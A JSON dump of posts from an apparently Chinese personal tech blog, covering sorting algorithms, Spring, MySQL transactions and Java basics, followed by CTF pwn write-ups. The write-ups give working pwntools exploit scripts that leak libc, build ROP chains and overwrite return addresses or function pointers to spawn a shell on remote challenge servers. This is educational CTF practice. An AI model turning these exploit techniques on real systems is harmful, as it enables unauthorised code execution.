[{"title":"Algorithm","date":"2019-09-14T05:14:18.000Z","path":"2019/09/14/Algorithm/","text":"工具 交换方法 123456//交换方法 public static void swap(int a[],int index1,int index2)&#123; int tmp = a[index1]; a[index1] = a[index2]; a[index2] = tmp; &#125; 排序对数器 1234//排序对数器 public static void rightMethod(int a[])&#123; Arrays.sort(a); &#125; 生成随机数组 12345678910//生成随机数组 public static int[] generateRandomArray(int maxSize, int maxValue) &#123; //生成一个数组，长度是随机的 int[] arr = new int[(int) ((maxSize + 1) * Math.random())]; for (int i = 0; i &lt; arr.length; i++) &#123; //每一个数是随机的 arr[i] = (int) ((maxValue + 1) * Math.random()) - (int) (maxValue * Math.random()); &#125; return arr; &#125; 数组拷贝 123456789//数组拷贝 public static int[]copyArray(int[]arr)&#123; if (arr==null) return null; int[]res = new int[arr.length]; for (int i=0;i&lt;arr.length;i++)&#123; res[i]=arr[i]; &#125; return res; &#125; 数组判断相等 123456789101112131415161718//数组判断相等 public static boolean isEqual(int[] arr1, int[] arr2) &#123; if ((arr1 == null &amp;&amp; arr2 != null) || (arr1 != null &amp;&amp; arr2 == null)) &#123; return false; &#125; if (arr1 == null &amp;&amp; arr2 == null) &#123; return true; &#125; if (arr1.length != arr2.length) &#123; return false; &#125; for (int i = 0; i &lt; arr1.length; i++) &#123; if (arr1[i] != arr2[i]) &#123; return false; &#125; &#125; return true; &#125; 打印数组 12345678910//打印数组 public static void printArray(int[] arr) &#123; if (arr == null) &#123; return; &#125; for (int i = 0; i &lt; arr.length; i++) &#123; System.out.print(arr[i] + \" \"); &#125; System.out.println(); &#125; 排序 冒泡排序 原理：从第一个位置开始，比较这一个位置和下一个位置数的大小，如果这一个位置数更大，就和下个位置的数交换，一轮下来保证n个数中最大的数到大最后，下一轮完成后剩下的n-1个数中最大的数到达倒数第二个位置。 代码： 12345678910111213//冒泡排序 public static void bubbleSort(int a[])&#123; if (a==null||a.length&lt;2) return; //最外层表示这一轮要确定第几个位置的数 for (int end=a.length-1;end&gt;0;end--)&#123; //内层循环依次比较并交换相邻位置的数 for (int i =0;i&lt;end;i++)&#123; if (a[i]&gt;a[i+1])&#123; Tool.swap(a,i,i+1); &#125; &#125; &#125; &#125; 时间复杂度：O(n^2^) 空间复杂度：O(1) 选择排序 原理：每次遍历找出剩下的数中最小的数放在对应位置，每次遍历的时候前i个数有序 代码： 123456789101112131415161718public static void selectionSort(int arr[])&#123; if (arr==null||arr.length&lt;2)&#123; return; &#125; //外层循环从第1个位置到第n-1个位置 for (int i=0;i&lt;arr.length-1;i++)&#123; int minIndex = i; //内层循环从第2个位置到第n个位置 for (int j =i+1;j&lt;arr.length;j++)&#123; //满足条件，记录下标 if (arr[j]&lt;arr[minIndex])&#123; minIndex = j; &#125; &#125; //内层结束，交换 Tool.swap(arr,i,minIndex); &#125; &#125; 时间复杂度：O(n^2^) 空间复杂度：O(1) 插入排序 原理：从第i个数开始遍历将更小的数插入前面的有序数组中 代码： 12345678public static void insertSort(int arr[])&#123; if (arr==null||arr.length&lt;2) return; for(int i=1;i&lt;arr.length;i++)&#123; for (int j=i-1;j&gt;=0;j--)&#123; if (arr[j]&gt;arr[j+1]) Tool.swap(arr,j,j+1); &#125; &#125; &#125; 时间复杂度：O(n^2^) 空间复杂度：O(1) 归并排序 原理：分为递归和合并两个部分，递归是为了将大数组分解为两个小数组，合并就是排序的过程 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public static void mergeSort(int arr[])&#123; if (arr==null||arr.length&lt;2) return; sort(arr,0,arr.length-1); &#125;//归并排序 public static void sort(int arr[],int l,int r)&#123; if (l==r) return; //切一半 int mid = l + ((r-l)&gt;&gt;1); //左边递归 sort(arr,l,mid); //右边递归 sort(arr,mid+1,r); //合并 merge(arr,l,r,mid); &#125;//合并 public static void merge(int arr[],int l,int r,int mid)&#123; //定义一个新的数组，数组长度和这一轮递归的l和r有关 int []res = new int[r-l+1]; int p1 = l; int p2 = mid+1; int i = 0; //排序、移动下标 while(p1 &lt;= mid &amp;&amp; p2 &lt;= r)&#123; if (arr[p1]&lt;arr[p2])&#123; res[i++] = arr[p1++]; &#125; else &#123; res[i++] = arr[p2++]; &#125; &#125; //当其中一边先移动完成，另一边直接复制，因为是有序的 while (p1&lt;=mid)&#123; res[i++] = arr[p1++]; &#125; while (p2&lt;=r)&#123; res[i++] = arr[p2++]; &#125; //因为传递的是引用，所以直接在这里改动原来的数组，以l作为起始位置即可。 for (int j =0;j&lt;res.length;j++)&#123; arr[l+j] = res[j]; &#125; &#125; 时间复杂度：O(log2n)，用master公式计算 空间复杂度：O(n)，数据有多少就要多少额外空间装","tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://yoursite.com/tags/Algorithm/"}]},{"title":"","date":"2019-09-11T09:24:38.000Z","path":"2019/09/11/JavaSpring/","text":"Spring概述 什么是Spring Spring是一个开放源代码的设计层面框架，他解决的是业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用。 Spring是于2003 年兴起的一个轻量级的Java 开发框架 简单来说，Spring是一个分层的JavaSE/EE full-stack(一站式) 轻量级开源框架。 IOC 什么是IOC IOC又叫控制反转，将对象的创建权力反交给Spring 传统开发模式 业务和实现类过于紧密，底层业务更改要修改源代码 通过工厂可以实现接口和业务的分离 在工厂内部使用配置文件加载（解析XML-&gt;反射创建对象-&gt;返回对象） Spring-IOC的使用 添加JAR包 创建配置文件 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"userDao\" class=\"demo1.UserDaoOracleImpl\"&gt; &lt;!-- name:要注入的属性名称 value:注入(赋值)的值 属性:要提供set方法 --&gt; &lt;property name=\"name\" value=\"lk123456\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 一个&lt;bean&gt;&lt;/bean&gt;标签里管理一个类的对象 id属性是用于获取对象的唯一标识 class属性是获取哪个类的对象 测试使用 接口 123456package demo1;public interface UserDao &#123; public void save(); public void delete();&#125; 接口实现类UserDaoOracleImpl 12345678910111213141516171819package demo1;public class UserDaoOracleImpl implements UserDao &#123; public String name; public void setName(String name) &#123; this.name = name; &#125; @Override public void save() &#123; System.out.println(\"oracle-save\"); &#125; @Override public void delete() &#123; System.out.println(\"oracle-delete\"); &#125;&#125; 12345678910111213141516171819package demo1;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class UserTest &#123; @Test public void test()&#123; //spring //1.加载配置文件 ApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); //2.根据id获取对象 UserDao userDao = (UserDao) applicationContext.getBean(\"userDao\"); userDao.save(); userDao.delete(); &#125;&#125; 使用的时候我们用接口类的来创建对象，假如我们想更改实现方式，只需实新的类以及修改配置文件即可，不需要修改实现的代码。 DI 依赖注入 给spring管理类当中依赖的属性,通过配置文件进行赋值的过程 传统方式 123456public void test2()&#123; //传统 UserDaoOracleImpl userDaoOracle = new UserDaoOracleImpl(); userDaoOracle.name = \"lk\"; System.out.println(userDaoOracle.name); &#125; 使用面向接口的编程方式没有办法设置属性值 DI方式 实现类当中的属性要提供set方法 在配置文件当中配置依赖注入 通过property标签设置 12345678&lt;bean id=\"userDao\" class=\"demo1.UserDaoOracleImpl\"&gt; &lt;!-- name:要注入的属性名称 value:注入(赋值)的值 属性:要提供set方法 --&gt; &lt;property name=\"name\" value=\"lk123456\"/&gt; &lt;/bean&gt; Bean相关配置 名称与标识： id：使用了约束中的唯一约束。里面不能出现特殊字符的 name：没有使用约束中的唯一约束。里面可以出现特殊字符。 设置对象的生命周期方法 init-method：Bean被初始化的时候执行的方法 destroy-method：Bean被销毁的时候执行的方法（Bean是单例创建，工厂关闭） 123&lt;bean id=\"person\" class=\"demo2.Person\" init-method=\"init\" destroy-method=\"destroy\" scope=\"prototype\"&gt; &lt;property name=\"name\" value=\"faint-star\"/&gt;&lt;/bean&gt; 当加载配置文件时调用init-method，当关闭工厂时调用destroy-method 1234567891011public class PersonTest &#123; @Test public void test()&#123; //加载核心配置文件(此时创建实例，执行init方法，创建文件里的所有对象) ClassPathXmlApplicationContext classPathXmlApplicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); Person person = (Person) classPathXmlApplicationContext.getBean(\"person\"); System.out.println(person.name); //关闭工厂,所有对象都会销毁----单例 classPathXmlApplicationContext.close(); &#125;&#125; Bean的作用范围的配置 singleton：默认的，Spring会采用单例模式创建这个对象。 prototype：多例模式。 request：应用在web项目中，Spring创建这个类以后，将这个对象存入到request范围中。 session：应用在web项目中，Spring创建这个类以后，将这个对象存入到session范围中 globalsession：应用在web项目中，必须在porlet(基于Java的Web组件，子域名)环境下使用。但是如果没有这种环境，相对于session。 工厂实例化的方式 无参构造-默认 只需提供一个默认构造函数即可 静态工厂实例化 1&lt;bean id=\"user\" class=\"demo3.User\" factory-method=\"createUser\"&gt;&lt;/bean&gt; 123456789101112131415package demo3;import javax.jws.soap.SOAPBinding;public class User &#123;// public User()&#123;// super();// System.out.println(\"默认构造方法\");// &#125; public static User createUser()&#123; System.out.println(\"调用了createUser\"); //必须返回对象 return new User(); &#125;&#125; 分模块配置 在加载时，添加多个配置文件名称 在一个配置文件当中引入另一个配置文件 12&lt;!--导入另外的配置文件--&gt; &lt;import resource=\"applicationContext2.xml\"/&gt; Spring属性注入 构造方法方式属性注入 待注入类中实现一个带参数的构造方法 1234public Student(String name,Integer age)&#123; this.name=name; this.age=age; &#125; bean中配置 12&lt;constructor-arg name=\"name\" value=\"潘星波\"/&gt;&lt;constructor-arg name=\"age\" value=\"10\"/&gt; Set方法的属性注入 待注入类中给待注入的参数实现set方法 bean中配置 1&lt;property name=\"name\" value=\"faint-star\"/&gt; P名称空间的属性注入 使用p名称空间，就不需要写那那么多的property 使用时，要添加名称空间 1xmlns:p=\"http://www.springframework.org/schema/p\" bean中配置 1&lt;bean id=\"dog\" class=\"demo4.Dog\" p:age=\"10\" p:name=\"wc\" p:color=\"red\"&gt;&lt;/bean&gt; 集合类型注入 数组、List、Map、Set都要先定义set方发 数组bean中配置 12345678&lt;!--数组--&gt; &lt;property name=\"attr\"&gt; &lt;list&gt; &lt;value&gt;zs&lt;/value&gt; &lt;value&gt;ls&lt;/value&gt; &lt;value&gt;ww&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; List的bean中配置 1234567&lt;!--list--&gt; &lt;property name=\"myList\"&gt; &lt;list&gt; &lt;value&gt;123&lt;/value&gt; &lt;value&gt;456&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; Map的bean中配置 12345678&lt;!--map--&gt; &lt;property name=\"myMap\"&gt; &lt;map&gt; &lt;entry key=\"ke1\" value=\"value1\"&gt;&lt;/entry&gt; &lt;entry key=\"ke2\" value=\"value2\"&gt;&lt;/entry&gt; &lt;entry key=\"ke3\" value=\"value3\"&gt;&lt;/entry&gt; &lt;/map&gt; &lt;/property&gt; Set的bean中配置 1234567&lt;!--set--&gt; &lt;property name=\"mySet\"&gt; &lt;set&gt; &lt;value&gt;000&lt;/value&gt; &lt;value&gt;111&lt;/value&gt; &lt;/set&gt; &lt;/property&gt; IOC注解方式 在spring4之后，想要使用注解形式，必须得要引入aop的包 在配置文件当中，还得要引入一个context约束 配置组件扫描，指定在哪个包下扫描 1&lt;context:component-scan base-package=\"com.cauc\"/&gt; 在类的开头添加注解，表示将这个类交给Spring来管理 12345@Component(\"dog\")public class Dog &#123; @Value(\"WC\") public String name;&#125; 如果提供了set方法，在set方法上添加@value(“值”); 12345@Component(\"dog\")public class Dog &#123; @Value(\"WC\") public String name;&#125; IOC注解详解 @Component：修改一个类，将这个类交给Spring管理 相当于在配置文件当中配置 @Component三个衍生注解：为了更好的进行分层，Spring可以使用其它三个注解，功能类似，目前使用哪一个功能都一样， 后期可能会添加一些属于各自的属性 @Controller：web层 @Service：service层 @Repository：dao层 属性注入： 1234567891011121314151617181920212223//IOC@Component(\"user\")//单例/实例@Scope(\"prototype\")public class User &#123; //变量注入 @Value(\"潘星波\") public String name;// @Autowired/*根据类型注入*/// @Qualifier(\"dog\")/*根据名称注入*/ @Resource(name=\"dog\") public Dog dog; //初始化执行 @PostConstruct public void init()&#123; System.out.println(\"init---初始化\"); &#125; //销毁执行 @PreDestroy public void destroy()&#123; System.out.println(\"destroy---销毁\"); &#125;&#125; XML与注解比较 XML可以适用任何场景 ，结构清晰，维护方便 注解不是自己提供的类使用不了，开发简单方便 XML与注解整合开发 XML管理Bean 注解完成属性注入 使用过程中， 可以不用扫描，扫描是为了类上的注解 在没有扫描的情况下， 使用属性注解@Resource @Value @Autowired @Qulifier AOP AOP简介： 在软件业，AOP为Aspect Oriented Programming的缩写，意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。和python的装饰器有相似之处。 JDK动态代理（有接口的情况下） 当我们想给类增加或者删除功能，可以使用动态代理的方式，这样可以不用频繁的改动代码。类似python的装饰器 定义一个接口 1234public interface GoodsDao &#123; public void save(); public void update();&#125; 定义接口的实现类 1234567891011public class GoodsDaoImpl implements GoodsDao &#123; @Override public void save() &#123; System.out.println(\"保存操作\"); &#125; @Override public void update() &#123; System.out.println(\"更新\"); &#125;&#125; 定义测试类 1234567public class GoodsDaoTest &#123; @Test public void test()&#123; GoodsDao goodsDao = new GoodsDaoImpl(); goodsDao.save(); &#125;&#125; 假如此时需要修改功能，比如增加校验功能，我们需要修改许多代码，这时我们使用面向AOP编程，即使用JDK动态代理，使用步骤如下 定义一个代理类 其中方法接收一个代理的对象，并返回经过功能强化后的对象 1234567891011121314151617public class GoodsJDKProxy &#123; //接收待强化功能的对象 public GoodsDao createProxy(GoodsDao goodsDao)&#123; //增强 GoodsDao goodsDaoProxy = (GoodsDao) Proxy.newProxyInstance(goodsDao.getClass().getClassLoader(), goodsDao.getClass().getInterfaces(), new InvocationHandler() &#123; @Override/*当调用对象的时候，所有的方法都会来到这里*/ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (\"save\".equals(method.getName()))&#123; System.out.println(\"权限校验\"); &#125; return method.invoke(goodsDao,args); &#125; &#125;); return goodsDaoProxy; &#125;&#125; Proxy.newProxyInstance方法: 第一个参数：通过获取对象字节码的方式，加载对象 第二个参数：获取对象的接口 第三个参数：一个回调函数，对每个该对象的方法被调用的时候都为来到这里是增强功能的关键 测试 123456789101112public class GoodsDaoTest &#123; @Test public void test()&#123; GoodsDao goodsDao = new GoodsDaoImpl(); //创建自定义的代理类 GoodsJDKProxy goodsJDKProxy = new GoodsJDKProxy(); //获取的代理对象 GoodsDao proxy = goodsJDKProxy.createProxy(goodsDao); proxy.save(); proxy.update(); &#125;&#125; 1","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"SSH","slug":"SSH","permalink":"http://yoursite.com/tags/SSH/"}]},{"title":"mysql-base","date":"2019-09-05T03:36:21.000Z","path":"2019/09/05/mysql-base/","text":"关系型数据库是以表的形式存储数据，非关系型数据库是以键值对的形式存储数据 Mysql端口号3306 事务什么是事务 不可分割的操作,假设该操作有ABCD四个步骤组成. 若ABCD四个步骤都成功完成,则认为事务成功. 若ABCD中任意一个步骤操作失败,则认为事务失败 每条sql语句都是一个事务 事务只对DML语句有效,对于DQL无效 事务的ACID 原子性 原子性是指事务包含的所有操作要么全部成功，要么全部失败回滚 一致性 一致性是指事务必须使数据库从一个一致性状态变换到另一个一致性状态，也就是说一个事务执行之前和执行之后都必须处于一致性状态。 让数据保持一定上的合理 一个商品出库时，仓库商品数量减1，对应用户的购物车中商品加1 隔离性 隔离性是当多个用户并发访问数据库时，比如操作同一张表时，数据库为每一个用户开启的事务，不能被其他事务的操作所干扰，多个并发事务之间要相互隔离。 持久性 持久性是指一个事务一旦被提交了，就不能再回滚了，已经把数据保存到数据库当中了。 事务的使用 开启事务（start transaction） 提交事务（commit） 所有语句全部执行完毕，没有发生异常,提交事务，更新到数据库当中。 回滚事务（rollback） 当遇到一突发情况，撤销执行的sql语句 事务的并发问题 脏读 访问到了还没有提交的事务所产生的结果 解决办法：Read committed！读提交，能解决脏读问题 不可重复读 一个事务范围内两个相同的查询却返回了不同数据，这就是不可重复读 解决办法：Repeatable read 重复读：当事务开启时，不允许其他的事务的UPDATA修改操作 幻读：事务开启的时候读到一个结果，事务提交又读到一个结果，两者不一样 对应关系： 事务隔离级别 脏读 不可重复读 幻读 读未提交 是 是 是 不可重复读 否 是 是 可重复读 否 否 是 串行化 否 否 否 事务隔离级别 Read uncommitted：就是一个事务可以读取另一个未提交事务的数据 Read committed：一个事务要等另一个事务提交后才能读取数据 Repeatable read：就是在开始读取数据（事务开启）时，不再允许修改操作 Serializable ：在该级别下，事务串行化顺序执行，可以避免脏读、不可重复读与幻读 查看隔离级别 select @@global.tx_isolation,@@tx_isolation; 设置隔离级别 全局的： set global transaction isolation level read committed; 当前会话： set session transaction isolation level read committed;","tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"basic","slug":"basic","permalink":"http://yoursite.com/tags/basic/"}]},{"title":"javaBasic","date":"2019-09-02T10:56:20.000Z","path":"2019/09/02/javaBasic/","text":"Java Package区别类名的命名空间，作用如下 把功能相似或相关的类或接口组织在同一个包中，方便类的查找和使用。 如同文件夹一样，包也采用了树形目录的存储方式。同一个包中的类名字是不同的，不同的包中的类的名字是可以相同的，当同时调用两个不同包中相同类名的类时，应该加上包名加以区别。因此，包可以避免名字冲突。 包也限定了访问权限，拥有包访问权限的类才能访问某个包中的类。Java 使用包（package）这种机制是为了防止命名冲突，访问控制，提供搜索和定位类（class）、接口、枚举（enumerations）和注释（annotation）等。 抽象方法抽象方法只有方法声明，没有方法主体 12345abstract class xy&#123; //错误 abstract sum (int x, int y) &#123; &#125;&#125; 接口接口中的属性在不提供修饰符修饰的情况下，会自动加上public static final 属性不能用private，protected,default 修饰，因为默认是public 如果属性是基本数据类型，需要赋初始值，若是引用类型，也需要初始化，因为默认有final修饰，必须赋初始值； 接口中常规的来说不能够定义方法体，所以无法通过get和set方法获取属性值，所以属性不属于对象，属于类（接口），因为默认使用static修饰。 Java.lang包 包装类 String 类 Math 类 —— 包含函数 Class 类 Object 类 线程销毁run()方法的执行结束，start()方法开启一个线程并执行run()方法，start()结束run()不一定结束。start()方法是让线程变成就绪态。 JVM内存划分 方法区：存放class和static变量，方法区中包含的都是在程序中唯一的元素 虚拟机栈：执行引擎每次调用一个函数时，就为这个函数创建一个栈帧并将他入栈。 本地方法区：与虚拟机栈作用相似，但它为native方法服务（native方法是Java调用非Java代码的接口） 堆：所有线程共享的区域，在虚拟机启动时创建，所有对象实例及数组都在堆上分配。 程序计数器：每个线程得有个计数器记录当前执行到哪个指令。 在栈帧里的基本数据类型必须初始化，而在堆里的基本数据类型有初始值。 数组创建的步骤 声明变量 在堆中用new关键字初始化数组 把被初始化的数组的地址赋值给声明的变量 GC:垃圾回收机制程序员不需要再手动的控制内存的释放，当JVM发现内存资源紧张的时候，会自动的清理无用的对象，JVM的垃圾回收机制中，判断一个对象是否死亡，并不是根据是否还有对象对其有引用，而是通过可达性分析。对象之间的引用可以抽象成树形结构，通过树根（GC Root）作为起点，从这些树根向下搜索，搜索过的链称为引用链，当一个对象到GC Root没有任何引用链时，证明这个给对象是不可用的，该对象会被判定为可回收对象。 数据类型 基本数据类型：只存放在栈中 引用数据类型：堆中存放实体，栈中存放地址（new出来的都是引用数据类型）","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"language","slug":"language","permalink":"http://yoursite.com/tags/language/"}]},{"title":"algorithm1","date":"2019-09-02T10:21:20.000Z","path":"2019/09/02/algorithm1/","text":"两数之和 思路:使用一个HashMap，便利数组，每次将互补的数作为key，下标作为value存入HashMap中；并且查看nums[i]是否存在于HashMap中，若存在则获取下标，因为之存在一组结果，所以内外都要返回。 代码： 123456789101112131415class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; HashMap &lt;Integer,Integer&gt; tmpMap = new HashMap&lt;Integer,Integer&gt;(); int index[]=new int[2]; for(int i=0;i&lt;nums.length;i++)&#123; if(tmpMap.containsKey(nums[i]))&#123; index[0]=i; index[1]=tmpMap.get(nums[i]); return index; &#125; tmpMap.put(target - nums[i],i); &#125; return index; &#125;&#125; 时间复杂度: O(n)","tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://yoursite.com/tags/algorithm/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"pwn100","date":"2019-08-22T02:40:31.000Z","path":"2019/08/22/pwn100/","text":"溢出点:自己定义了一个read函数，是在原来的read上进行包装，读满200个字节才退出 1234567891011121314__int64 __fastcall my_read(__int64 a1, signed int a2)&#123; __int64 result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; result = (unsigned int)i; if ( i &gt;= a2 ) break; read(0, (void *)(i + a1), 1uLL); &#125; return result;&#125; 然而read读到的内容是放在调用函数这一层rbp-0x40h的地方，肯定会溢出 1234567int sub_40068E()&#123; char v1; // [rsp+0h] [rbp-40h] my_read((__int64)&amp;v1, 200); return puts(\"bye~\");&#125; 利用:123456[*] '/mnt/hgfs/linux_share/pwn/xctf/pwn100/pwn100' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 泄露libc版本，然后调用system(&#39;/bin.sh&#39;) exp:12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level='debug'# p = process('./pwn100')p=remote('111.198.29.45',45415)# gdb.attach(p,'b*0x00000000004006B6')elf = ELF('./pwn100')start_addr =0x00000000004006B8pop_rdi = 0x0000000000400763payload1 = (0x48*'a'+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(start_addr)).ljust(200,'a')p.send(payload1)p.recvuntil('bye~\\n')unpack = p.recvuntil('\\n',drop=True).ljust(0x8,'\\x00')put_addr = hex(u64(unpack))info('puts: '+ put_addr)payload2 = (0x48*'a'+p64(pop_rdi)+p64(elf.got['read'])+p64(elf.plt['puts'])+p64(start_addr)).ljust(200,'a')p.send(payload2)p.recvuntil('bye~\\n')unpack = p.recvuntil('\\n',drop=True).ljust(0x8,'\\x00')read_addr = hex(u64(unpack))info('read: '+ read_addr)obj = LibcSearcher(\"puts\", int(put_addr,16))obj.add_condition('read', int(read_addr,16))system = int(put_addr,16) + obj.dump(\"system\") - obj.dump('puts')bin_sh = int(put_addr,16) + obj.dump(\"str_bin_sh\") - obj.dump('puts')payload3 = (0x48*'a'+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(start_addr)).ljust(200,'a')p.sendline(payload3)p.interactive() 这个LibcSearcher的添加条件功能不太会用，不知道为啥加了条件出来的结果反而变多了，我就手动选了一个，竟然一次就对了- -，我选的3 1234567891011Multi Results: 0: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386) 1: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386) 2: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386) 3: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) 4: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) 5: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386) 6: archive-old-glibc (id libc6-i386_2.19-10ubuntu2.3_amd64)Please supply more info using add_condition(leaked_func, leaked_address).You can choose it by hand","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"overflow","slug":"overflow","permalink":"http://yoursite.com/tags/overflow/"}]},{"title":"stack2","date":"2019-08-21T00:29:12.000Z","path":"2019/08/21/stack2/","text":"程序逻辑:输入几个数，然后可以使用程序提供的4个功能进行操作，直到输入5程序才会退出。 1puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); 溢出点:12345puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; 更改数的功能，下标v5的范围没有限制，会导致数组越界，我们可以利用他来向栈上更高地址的位置写入数据，将返回地址改写使他跳转到开shell的函数处执行 1234int hackhere()&#123; return system(\"/bin/bash\");&#125; 这道题因为环境的问题远程服务器上没有/bin/bash的shell，可以用sh的shell，/bin/sh的地址是0x08048980，加7就是sh的地址 1.rodata:08048980 command db &apos;/bin/bash&apos;,0 ; DATA XREF: hackhere+14↑o 栈上布局:123456789low esp---&gt; +-----------------+ | call system | +-----------------+ | sh | +-----------------+ | | | | | |high +-----------------+ 关于返回地址的位置，我一开始也以为是直接与v13相隔0x70的位置后来调试发现不对，是相差了132的地方，还是要以程序运行时的调试结果为准。 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level='debug'# p = process('./stack2')p = remote('111.198.29.45',45441)# gdb.attach(p,\"b*0x080488EE\")def set_addr(): # 0x080485B4 call _system p.sendline('3') p.sendafter('which number to change:','132\\n') p.sendafter('new number:','180\\n') p.sendline('3') p.sendafter('which number to change:', '133\\n') p.sendafter('new number:', '133\\n') p.sendline('3') p.sendafter('which number to change:', '134\\n') p.sendafter('new number:', '4\\n') p.sendline('3') p.sendafter('which number to change:', '135\\n') p.sendafter('new number:', '8\\n') # 0x08048987 '/bin/sh'[7] p.sendline('3') p.sendafter('which number to change:', '136\\n') p.sendafter('new number:', '135\\n') p.sendline('3') p.sendafter('which number to change:', '137\\n') p.sendafter('new number:', '137\\n') p.sendline('3') p.sendafter('which number to change:', '138\\n') p.sendafter('new number:', '4\\n') p.sendline('3') p.sendafter('which number to change:', '139\\n') p.sendafter('new number:', '8\\n') p.sendline('5')pause()p.sendafter('How many numbers you have:','4\\n')p.sendafter('Give me your numbers','1 2 3 4\\n')set_addr()p.interactive()","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"warmup","date":"2019-08-20T15:07:30.000Z","path":"2019/08/20/warmup/","text":"溢出点:scanf输入字符串的时候没有检查长度 123char v2[32]; // [esp+10h] [ebp-74h]//...__isoc99_scanf(\"%s\", v2); 逻辑分析: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546for ( i = 0; ; ++i ) &#123; v0 = i; if ( v0 &gt;= strlen(v2) ) break; switch ( v14 ) &#123; case 1: if ( sub_8048702(v2[i]) ) v14 = 2; break; case 2: if ( v2[i] == '@' ) v14 = 3; break; case 3: if ( check2(v2[i]) ) v14 = 4; break; case 4: if ( v2[i] == '.' ) v14 = 5; break; case 5: if ( check3(v2[i]) ) v14 = 6; break; case 6: if ( check3(v2[i]) ) v14 = 7; break; case 7: if ( check3(v2[i]) ) v14 = 8; break; case 8: if ( check3(v2[i]) ) v14 = 9; break; case 9: v14 = 10; break; default: continue; &#125; &#125; 这一大段其实就是依次检查我们输入的字符串的每一位并将v14置成对应的数，但其实这一段并没什么用 关键是这一段 1(*(&amp;v3 + --v14))(); v3加上v14减去1，将这个地址开始的指令当作函数来执行。v14初始值为1，我们简单点上面的检查都不通过，那么到这一步，地址就只取决于v3 123456789101112size_t v0; // ebx char v2[32]; // [esp+10h] [ebp-74h] int (*v3)(); // [esp+30h] [ebp-54h] int (*v4)(); // [esp+34h] [ebp-50h] int (*v5)(); // [esp+38h] [ebp-4Ch] int (*v6)(); // [esp+3Ch] [ebp-48h] int (*v7)(); // [esp+40h] [ebp-44h] int (*v8)(); // [esp+44h] [ebp-40h] int (*v9)(); // [esp+48h] [ebp-3Ch] int (*v10)(); // [esp+4Ch] [ebp-38h] int (*v11)(); // [esp+50h] [ebp-34h] int (*v12)(); // [esp+54h] [ebp-30h] 观察到v3的位置是在相对v2高地址的地方，我们可以通过v2的输入来覆盖v3的值 exp:123456789101112from pwn import *context.log_level='debug'# p = process('./forgot')p=remote('111.198.29.45',42514)p.recvuntil('&gt; ')p.sendline('faint-star')payload = 0x20*'A'+p32(0x080486CC)p.recvuntil('&gt; ')p.sendline(payload)p.interactive()","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"overflow","slug":"overflow","permalink":"http://yoursite.com/tags/overflow/"}]},{"title":"dice-game","date":"2019-08-20T14:11:56.000Z","path":"2019/08/20/dice-game/","text":"溢出点:123char buf[55]; // [rsp+0h] [rbp-50h]//...v6 = read(0, buf, 0x50uLL); 读进来的数据刚好能覆盖到rbp指针之前，无法覆盖返回地址。 分析:程序会不停的产生随机数，猜中50次就能得到flag。当然随机是伪随机，当seed一定时产生的数列是一定的，这个seed也是存放在栈上，溢出点虽然无法利用来覆盖返回地址，但是可以覆盖栈上的local variable。 产生随机数:产生一个长度为50的seed为0的伪随机序列: 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123; unsigned int seed[2]=&#123;0,0&#125;; srand(seed[0]); for (int i = 0; i &lt;= 49; ++i )&#123; int r = rand() % 6 + 1; printf(\"%d \",r); &#125;&#125; exp:123456789101112131415161718from pwn import *context.log_level='debug'# p=process('./dice_game')p=remote('111.198.29.45',35516)index=0num = '2 5 4 2 6 2 5 1 4 2 3 2 3 2 6 5 1 1 5 5 6 3 4 4 3 3 3 2 2 2 6 1 1 1 6 4 2 5 2 5 4 4 4 6 3 2 3 3 6 1'.split()payload = 0x40*'a'+p64(0)p.recvuntil('Welcome, let me know your name: ')p.sendline(payload)for 